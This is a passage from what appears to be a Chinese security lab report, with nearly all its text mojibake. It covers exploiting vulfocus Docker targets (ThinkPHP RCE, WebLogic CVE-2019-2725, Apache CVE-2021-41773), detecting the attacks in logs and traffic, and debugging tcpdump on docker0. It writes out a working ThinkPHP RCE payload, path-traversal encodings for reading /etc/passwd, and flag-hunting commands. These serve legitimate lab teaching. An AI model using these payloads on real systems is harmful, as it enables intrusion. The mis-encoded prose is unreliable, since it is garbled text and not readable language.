   * **é’ˆå¯¹ `vulfocus/thinkphp-cve_2018_1002015:latest`** (ThinkPHP 5.x RCE æ¼æ´ï¼Œç±»ä¼¼ CVE-2018-20062):
     * é€šè¿‡åˆ†æé¶æ ‡åç§°å’Œ CVE ç¼–å·çš„æš—ç¤ºï¼Œæ¨æ–­å…¶ä¸ ThinkPHP 5.x çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç›¸å…³ã€‚
     * å­¦ä¹ å¹¶æŒæ¡äº†åˆ©ç”¨ ThinkPHP æ¡†æ¶å¯¹æ§åˆ¶å™¨åç§°è§£æç¼ºé™·çš„ RCE Payload æ„é€ æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯ `s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=<function_name>&vars[1][]=<argument>` çš„å½¢å¼ã€‚
     * æˆåŠŸæ‰§è¡Œäº† `phpinfo()` (éªŒè¯æ¼æ´å­˜åœ¨æ€§) å’Œ `id` (è·å–å½“å‰ç”¨æˆ·æƒé™ï¼Œç¡®è®¤ä¸º root)ï¼Œå¹¶æœ€ç»ˆé€šè¿‡ `find / -name '*flag*'` å‘½ä»¤å®šä½åˆ° flag æ–‡ä»¶ `/tmp/flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`ï¼Œå†é€šè¿‡ `cat` å‘½ä»¤è¯»å–äº† flag å†…å®¹ã€‚
     * æŒæ¡äº†å¯¹ URLä¸­ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ `[`ã€`]`ã€`{`ã€`}`ï¼‰è¿›è¡Œç™¾åˆ†å·ç¼–ç ä»¥ç¡®ä¿ `curl` å‘½ä»¤æ­£ç¡®æ‰§è¡Œçš„é‡è¦æ€§ã€‚
   * **é’ˆå¯¹ `vulfocus/weblogic-cve_2019_2725:latest`** (WebLogic Javaååºåˆ—åŒ–RCEæ¼æ´):
     * é€šè¿‡ç«¯å£æ‰«æç¡®è®¤WebLogic Server 10.3.6.0ç‰ˆæœ¬ï¼Œå®Œå…¨åŒ¹é…CVE-2019-2725å—å½±å“ç‰ˆæœ¬ã€‚
     * æ£€æµ‹å¹¶ç¡®è®¤wls-wsatå’Œasyncç»„ä»¶çš„å­˜åœ¨ï¼Œä¸ºæ¼æ´åˆ©ç”¨æä¾›äº†å…¥å£ç‚¹ã€‚
     * å­¦ä¹ å¹¶å®è·µäº†é€šè¿‡SOAP Headerä¸­çš„WorkContextç»„ä»¶ä¼ é€’æ¶æ„åºåˆ—åŒ–å¯¹è±¡çš„æ”»å‡»æŠ€æœ¯ã€‚
     * æˆåŠŸæ„é€ åŒ…å«ProcessBuilderçš„æ¶æ„XMLè½½è·ï¼Œå®ç°äº†æ— è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
     * é€šè¿‡HTTP 500å“åº”ç¡®è®¤ååºåˆ—åŒ–è§¦å‘ï¼Œè·å¾—oracleç”¨æˆ·æƒé™å¹¶æˆåŠŸæœç´¢åˆ°flagæ–‡ä»¶ã€‚
   * **é’ˆå¯¹ `vulfocus/apache-cve_2021_41773:latest`** (Apache HTTP Serverè·¯å¾„éå†æ¼æ´):
     * ç¡®è®¤Apache 2.4.49ç‰ˆæœ¬ï¼Œç²¾ç¡®åŒ¹é…CVE-2021-41773å—å½±å“ç‰ˆæœ¬ã€‚
     * æŒæ¡äº†URLç¼–ç ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥çš„æŠ€æœ¯ï¼Œä½¿ç”¨ `%2e%2e`å’Œ `.%2e`ç­‰ç¼–ç æ–¹å¼ã€‚
     * æˆåŠŸé€šè¿‡ `/icons/`è·¯å¾„å®ç°è·¯å¾„éå†ï¼Œè¯»å– `/etc/passwd`ç­‰æ•æ„Ÿç³»ç»Ÿæ–‡ä»¶ã€‚
     * å®ç°äº†é€šè¿‡CGIè·¯å¾„çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç›´æ¥è°ƒç”¨ `/bin/sh`æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
     * ç»¼åˆè¿ç”¨è·¯å¾„éå†å’ŒRCEæŠ€æœ¯ï¼ŒæˆåŠŸå®šä½å¹¶è·å–flagæ–‡ä»¶å†…å®¹ã€‚
3. **å¨èƒæ£€æµ‹ä¸æ—¥å¿—åˆ†æèƒ½åŠ›æå‡**ï¼š

   * **é¶æ ‡ä¸€ (Nginx + PHP)**:
     * é€šè¿‡ `docker exec` è¿›å…¥å®¹å™¨å†…éƒ¨ï¼ŒæˆåŠŸå®šä½å¹¶åˆ†æäº† Nginx çš„è®¿é—®æ—¥å¿— (`/var/log/nginx/access.log`)ï¼Œä»ä¸­ç­›é€‰å‡ºåŒ…å«æ¶æ„ `cmd` å‚æ•°çš„æ”»å‡»è¯·æ±‚è®°å½•ã€‚
     * è§£å†³äº†åœ¨ Kali ä¸»æœºï¼ˆåŒæ—¶ä½œä¸º Docker å®¿ä¸»æœºï¼‰ä¸Šä½¿ç”¨ `tcpdump` æ•è·é’ˆå¯¹æœ¬æœº Docker å®¹å™¨æµé‡æ—¶é‡åˆ°çš„ `0 packets captured` é—®é¢˜ã€‚é€šè¿‡é€æ­¥æ’æŸ¥ï¼Œæœ€ç»ˆç¡®å®šéœ€è¦ç›‘å¬ Docker çš„ç½‘æ¡¥æ¥å£ (`docker0`) å¹¶ä½¿ç”¨å®¹å™¨çš„å†…éƒ¨ IP (`172.17.0.2`) å’Œå®é™…æœåŠ¡ç«¯å£ (`80`) ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼ŒæˆåŠŸæ•è·å¹¶ä½¿ç”¨ Wireshark åˆ†æäº†æ”»å‡»æµé‡ï¼Œæ¸…æ™°è§‚å¯Ÿåˆ°äº† TCP æ¡æ‰‹ã€æ¶æ„ HTTP GET è¯·æ±‚åŠæœåŠ¡å™¨å“åº”ã€‚
   * **é¶æ ‡äºŒ (ThinkPHP)**:
     * åœ¨å®¹å™¨å†…ï¼Œé€šè¿‡å°è¯•å¸¸è§çš„ Web æœåŠ¡å™¨æ—¥å¿—è·¯å¾„å¤±è´¥åï¼Œæ ¹æ® ThinkPHP çš„ç‰¹æ€§ï¼Œåœ¨ `/app/runtime/log/` ç›®å½•ä¸‹æ‰¾åˆ°äº†æŒ‰æ—¥æœŸç»„ç»‡çš„æ¡†æ¶åº”ç”¨æ—¥å¿— (å¦‚ `/app/runtime/log/202505/24.log`)ã€‚åˆ†æäº†è¿™äº›æ—¥å¿—ï¼Œè¯†åˆ«äº†åŒ…å« RCE Payload çš„è¯·æ±‚è®°å½•ï¼Œå¹¶æ³¨æ„åˆ°äº†ä¼´éšçš„ `variable type error: boolean` é”™è¯¯ï¼ˆè™½ç„¶ä¸å½±å“æ¼æ´åˆ©ç”¨ï¼‰ã€‚
     * åŒæ ·åº”ç”¨äº†æ­£ç¡®çš„ `tcpdump` é…ç½®ï¼ˆç›‘å¬ `docker0`ï¼Œç›®æ ‡ä¸ºå®¹å™¨å†…éƒ¨ IP `172.17.0.2` å’Œç«¯å£ `80`ï¼‰ï¼Œæ•è·å¹¶ä½¿ç”¨ Wireshark åˆ†æäº†é’ˆå¯¹ ThinkPHP é¶æ ‡çš„æ”»å‡»æµé‡ï¼Œå†æ¬¡éªŒè¯äº†æ”»å‡»æ­¥éª¤å’Œæ•°æ®å›ä¼ ã€‚
   * **é¶æ ‡ä¸‰ (WebLogic)**:
     * æ·±å…¥WebLogicå®¹å™¨å†…éƒ¨ï¼Œå®šä½å¹¶åˆ†æäº†AdminServer.logå’Œaccess.logï¼ŒæˆåŠŸè¯†åˆ«äº†åŒ…å«ProcessBuilderå¼‚å¸¸çš„æ”»å‡»æ—¥å¿—ç‰¹å¾ã€‚
     * æŒæ¡äº†SOAPåè®®æµé‡çš„æ•è·å’Œåˆ†ææŠ€æœ¯ï¼Œé€šè¿‡Wiresharkè¯†åˆ«æ¶æ„XMLè½½è·ä¸­çš„WorkContextå’ŒProcessBuilderå…³é”®å­—ã€‚
     * å­¦ä¼šäº†é€šè¿‡HTTP 500çŠ¶æ€ç å’Œå¼‚å¸¸å“åº”æ—¶é—´æ¥åˆ¤æ–­ååºåˆ—åŒ–æ”»å‡»çš„æˆåŠŸä¸å¦ã€‚
   * **é¶æ ‡å›› (Apache)**:
     * åˆ†æäº†Apacheçš„è®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—ï¼Œè¯†åˆ«äº†è·¯å¾„éå†æ”»å‡»çš„ç‰¹å¾æ¨¡å¼ï¼ˆå¦‚ `%2e%2e`ç¼–ç ï¼‰ã€‚
     * è§‚å¯Ÿåˆ°Apacheçš„è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥æœºåˆ¶ï¼Œç†è§£äº†å“ªäº›æ”»å‡»è¢«æˆåŠŸé˜»æ­¢ï¼Œå“ªäº›ç»•è¿‡äº†é˜²æŠ¤ã€‚
     * é€šè¿‡CGIé”™è¯¯æ—¥å¿—åˆ†æï¼Œç¡®è®¤äº†RCEæ”»å‡»çš„æ‰§è¡Œæƒ…å†µå’Œshellè°ƒç”¨è¿‡ç¨‹ã€‚
4. **é—®é¢˜è§£å†³ä¸ç»éªŒç§¯ç´¯**ï¼š

   * å®éªŒä¸­æœ€æ˜¾è‘—çš„æŒ‘æˆ˜æ˜¯ `tcpdump` çš„é…ç½®ã€‚é€šè¿‡ç³»ç»Ÿæ€§çš„æ’æŸ¥ï¼ˆä» `any` æ¥å£åˆ°ç‰©ç†æ¥å£ `eth1`ï¼Œå†åˆ°å›ç¯æ¥å£ `lo`ï¼Œæœ€ç»ˆåˆ° Docker ç½‘æ¡¥ `docker0`ï¼‰ï¼ŒåŠ æ·±äº†å¯¹ Docker ç½‘ç»œæ¨¡å¼å’Œæœ¬åœ°æµé‡æ•è·å¤æ‚æ€§çš„ç†è§£ã€‚
   * é‡åˆ°äº† `curl` å›  URL ä¸­åŒ…å«æœªç¼–ç çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ `[]`ï¼‰è€ŒæŠ¥é”™çš„é—®é¢˜ï¼Œé€šè¿‡å­¦ä¹ å’Œåº”ç”¨ URL ç™¾åˆ†å·ç¼–ç æˆåŠŸè§£å†³ã€‚
   * åœ¨è¿›å…¥ Docker å®¹å™¨æ—¶ï¼Œå½“ `/bin/bash` ä¸å­˜åœ¨æ—¶ï¼Œå­¦ä¼šäº†å°è¯•ä½¿ç”¨ `/bin/sh`ã€‚

**æ€»ç»“ä¸åæ€**ï¼š
æœ¬æ¬¡å®éªŒç³»ç»Ÿæ€§åœ°å®è·µäº†ä»ç¯å¢ƒå‡†å¤‡ã€ä¿¡æ¯æ”¶é›†ã€æ¼æ´åˆ©ç”¨åˆ°å¨èƒæ£€æµ‹çš„å…¨è¿‡ç¨‹ï¼Œæ¶µç›–äº†å¤šç§ä¸åŒç±»å‹çš„Webåº”ç”¨å’Œä¸­é—´ä»¶æ¼æ´ï¼š

1. **æŠ€æœ¯å¹¿åº¦**: æ¶‰åŠäº†å‘½ä»¤æ³¨å…¥ã€æ¡†æ¶RCEã€Javaååºåˆ—åŒ–ã€è·¯å¾„éå†ç­‰å¤šç§æ”»å‡»æŠ€æœ¯
2. **æ£€æµ‹æ·±åº¦**: ä»åº”ç”¨å±‚æ—¥å¿—åˆ°ç½‘ç»œæµé‡ï¼Œä»ç³»ç»Ÿè¿›ç¨‹åˆ°æ–‡ä»¶ç›‘æ§çš„å…¨æ–¹ä½æ£€æµ‹å®è·µ
3. **å®æˆ˜ä»·å€¼**: è§£å†³äº†Dockerç½‘ç»œæµé‡æ•è·ã€URLç¼–ç å¤„ç†ã€å®¹å™¨ç¯å¢ƒé€‚é…ç­‰å®é™…é—®é¢˜
4. **å®‰å…¨æ„è¯†**: é€šè¿‡å¯¹æ¯”ä¸åŒåº”ç”¨çš„å®‰å…¨æœºåˆ¶ï¼Œæ·±å…¥ç†è§£äº†å„ç§é˜²æŠ¤æªæ–½çš„æœ‰æ•ˆæ€§å’Œå±€é™æ€§

é€šè¿‡å¯¹ä¸åŒç±»å‹åº”ç”¨ï¼ˆç®€å•PHPåº”ç”¨ã€ThinkPHPæ¡†æ¶ã€WebLogicä¸­é—´ä»¶ã€ApacheæœåŠ¡å™¨ï¼‰çš„æ”»å‡»å®è·µï¼Œå…¨é¢æŒæ¡äº†å„è‡ªçš„æ¼æ´ç‰¹ç‚¹ã€åˆ©ç”¨æ–¹å¼å’Œæ£€æµ‹æ–¹æ³•ã€‚è¿™äº›æŠ€èƒ½å’Œç»éªŒå¯¹äºæœªæ¥è¿›è¡Œæ›´å¤æ‚çš„æ¸—é€æµ‹è¯•ã€å®‰å…¨å®¡è®¡ä»¥åŠæ„å»ºæ›´æœ‰æ•ˆçš„é˜²å¾¡ç­–ç•¥éƒ½å…·æœ‰é‡è¦æ„ä¹‰ã€‚

# äº”ã€é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ

é…ç½®å’Œä½¿ç”¨ `tcpdump` è¿›è¡Œç½‘ç»œæµé‡æ•è·æ—¶ï¼Œ`tcpdump` æ— æ³•æ•è·åˆ°é¢„æœŸçš„æ•°æ®åŒ… (æ˜¾ç¤º `0 packets captured`)ã€‚ä»¥ä¸‹æ˜¯æ’æŸ¥å’Œè§£å†³é—®é¢˜çš„æ­¥éª¤ï¼š

1. **åˆæ­¥å°è¯•ä¸é—®é¢˜**:

   * æœ€åˆå°è¯•ä½¿ç”¨ `sudo tcpdump -i any -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap` å‘½ä»¤ã€‚å‚æ•° `-i any` æ„å›¾ç›‘å¬æ‰€æœ‰æ¥å£ã€‚
   * **ç»“æœ**: `0 packets captured`ã€‚åŒæ—¶å‡ºç°è­¦å‘Š `any: That device doesn't support promiscuous mode`ã€‚
     ![1748019457185](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019457185.png)
2. **æŒ‡å®šç‰©ç†/è™šæ‹Ÿç½‘ç»œæ¥å£ (`eth1`)**:

   * é€šè¿‡ `ip addr` å‘½ä»¤æŸ¥çœ‹ç½‘ç»œæ¥å£ï¼Œå‘ç° Kali è™šæ‹Ÿæœºçš„ IP `10.37.133.3` é…ç½®åœ¨ `eth1` æ¥å£ä¸Šã€‚
   * ä¿®æ”¹å‘½ä»¤ä¸º `sudo tcpdump -i eth1 -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap`ã€‚
   * **ç»“æœ**: ä»ç„¶æ˜¯ `0 packets captured`ã€‚
   * **åˆ†æ**: ç”±äºé¶æœºæœåŠ¡ (`10.37.133.3:8630`) å’Œæ”»å‡»å‘½ä»¤ (`curl`) å‡åœ¨åŒä¸€å° Kali ä¸»æœºä¸Šæ‰§è¡Œï¼Œæµé‡å¯èƒ½ä¸»è¦åœ¨æœ¬åœ°å›ç¯æˆ– Docker å†…éƒ¨ç½‘ç»œä¸­ï¼Œå¹¶æœªç»è¿‡ `eth1` æ¥å£è¿›è¡Œå¤–éƒ¨è·¯ç”±ã€‚
     ![1748019473424](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019473424.png)
3. **å°è¯•å›ç¯æ¥å£ (`lo`)**:

   * è€ƒè™‘åˆ°æµé‡å¯èƒ½åœ¨æœ¬åœ°ä¸»æœºå†…éƒ¨ï¼Œå°è¯•ç›‘å¬å›ç¯æ¥å£ï¼š`sudo tcpdump -i lo -A 'port 8630' -w nginx_php_flag_traffic.pcap`ã€‚
   * **ç»“æœ**: ä¾ç„¶æ˜¯ `0 packets captured`ã€‚
   * **åˆ†æ**: è¿™è¡¨æ˜æµé‡ç”šè‡³æ²¡æœ‰å®Œå…¨é€šè¿‡æ ‡å‡†çš„å›ç¯æ¥å£ï¼Œæˆ–è€…è¿‡æ»¤æ¡ä»¶ä¸å‡†ç¡®ã€‚æ›´æ·±å±‚çš„åŸå› åœ¨äº Docker çš„ç½‘ç»œæœºåˆ¶ã€‚

   ![1748019483551](image/ç¬¬ä¸€å±‚ä¸¤é¶æ ‡æ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹/1748019483551.png)
4. **æ·±å…¥ Docker ç½‘ç»œå±‚é¢è¿›è¡Œæ’æŸ¥ä¸è§£å†³**:

   * **ç†è§£ Docker ç½‘ç»œ**: å½“ Docker å®¹å™¨é€šè¿‡ç«¯å£æ˜ å°„ (å¦‚ `-p 8630:80`) æš´éœ²æœåŠ¡æ—¶ï¼Œå®¿ä¸»æœº (Kali) ä¸Šçš„è¯·æ±‚ (`http://10.37.133.3:8630`) ä¼šè¢« Docker è¿›ç¨‹æˆªè·ï¼Œå¹¶é€šè¿‡å…¶å†…éƒ¨çš„è™šæ‹Ÿç½‘æ¡¥ (é€šå¸¸æ˜¯ `docker0`) è·¯ç”±åˆ°å®¹å™¨çš„å†…éƒ¨ IP å’Œå®é™…ç«¯å£ (å¦‚ `172.17.0.2:80`)ã€‚
   * **è·å–å®¹å™¨å†…éƒ¨ IP**: ä½¿ç”¨ `docker ps` è·å–ç›®æ ‡å®¹å™¨çš„ ID (`c93755678f6c`)ã€‚ç„¶åä½¿ç”¨ `docker inspect c93755678f6c` æŸ¥çœ‹å…¶è¯¦ç»†ç½‘ç»œé…ç½®ã€‚
     ```json
     // docker inspect c93755678f6c è¾“å‡ºçš„å…³é”®éƒ¨åˆ†
     "NetworkSettings": {
         // ...
         "IPAddress": "172.17.0.2", // å®¹å™¨åœ¨ bridge ç½‘ç»œä¸Šçš„ IP
         "Networks": {
             "bridge": {
                 // ...
                 "IPAddress": "172.17.0.2",
                 "Gateway": "172.17.0.1",
                 // ...
             }
         }
     }
     ```
   * **ç¡®å®šç›‘å¬æ¥å£å’Œè¿‡æ»¤æ¡ä»¶**:
     * å®¹å™¨ IP ä¸º `172.17.0.2`ã€‚
     * å®¹å™¨å†…éƒ¨æœåŠ¡ç«¯å£ä¸º `80`ã€‚
     * å®¿ä¸»æœºä¸Šå¯¹åº”çš„ Docker ç½‘æ¡¥æ¥å£ä¸º `docker0` (å…¶ IP é€šå¸¸æ˜¯å®¹å™¨ç½‘ç»œçš„ç½‘å…³ï¼Œå¦‚ `172.17.0.1`)ã€‚
   * **æœ€ç»ˆæ­£ç¡®çš„ `tcpdump` å‘½ä»¤**:
     ```bash
     sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap
     ```
   * **ç»“æœ**: æˆåŠŸæ•è·åˆ°10ä¸ªæ•°æ®åŒ…ã€‚
   * **ç»“è®º**: å¯¹äºæ­¤ç±»å®¿ä¸»æœºä¸æœ¬æœº Docker å®¹å™¨é—´çš„é€šä¿¡ï¼Œéœ€è¦ç›‘å¬ Docker çš„è™šæ‹Ÿç½‘æ¡¥æ¥å£ (`docker0`)ï¼Œå¹¶ä½¿ç”¨å®¹å™¨çš„å†…éƒ¨ IP å’Œå®é™…æœåŠ¡ç«¯å£ä½œä¸ºè¿‡æ»¤æ¡ä»¶ã€‚
